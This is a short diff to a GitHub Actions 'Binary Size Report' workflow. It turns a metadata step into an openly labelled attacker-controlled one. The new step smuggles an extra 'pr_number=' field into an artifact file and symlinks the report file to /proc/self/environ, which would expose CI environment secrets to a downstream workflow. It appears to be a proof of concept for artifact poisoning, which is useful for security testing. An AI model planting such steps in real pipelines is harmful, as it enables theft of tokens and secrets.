@@ -8,14 +8,15 @@ jobs:
     name: Binary Size Report
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR Metadata and Report (baseline version on main)
+      - name: Attacker controlled metadata and report
         shell: bash
         run: |
           mkdir -p pr-data
-          echo "1" > pr-data/pr_number.txt
-          echo "main" > pr-data/base_ref.txt
-          echo "legit-branch" > pr-data/head_ref.txt
-          echo "<!-- binary-size-report -->" > pr-data/binary_size_report.md
+          printf '1\npr_number=424242\n' > pr-data/pr_number.txt
+          printf 'main\n' > pr-data/base_ref.txt
+          printf 'attacker-branch\n' > pr-data/head_ref.txt
+          ln -s /proc/self/environ pr-data/binary_size_report.md
+          ls -l pr-data/
 
       - name: Upload PR Data and Report
         uses: actions/upload-artifact@v7
